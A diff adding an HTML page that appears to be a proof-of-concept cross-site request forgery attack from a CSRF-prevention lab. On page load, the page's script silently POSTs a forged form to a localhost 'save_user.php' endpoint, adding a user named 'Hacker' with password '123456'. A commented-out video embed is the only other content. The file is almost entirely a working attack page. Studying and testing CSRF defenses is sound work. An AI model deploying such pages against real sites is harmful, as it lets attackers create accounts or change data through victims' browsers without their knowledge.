@@ -1,0 +1,23 @@
+<html>
+
+<head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script>
+        var dat = "uname=Hacker&pwd=123456&submit=Add+new+user";
+
+        $.ajax({
+
+            url: 'http://localhost:8082/CSRF_Prevention2/save_user.php',
+            method: 'post',
+            data: dat
+        })
+    </script>
+</head>
+
+<body>
+    <!--<iframe width="560" height="315" src="https://www.youtube.com/embed/dMwxIHIabeg" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+
+    -->
+</body>
+
+</html>
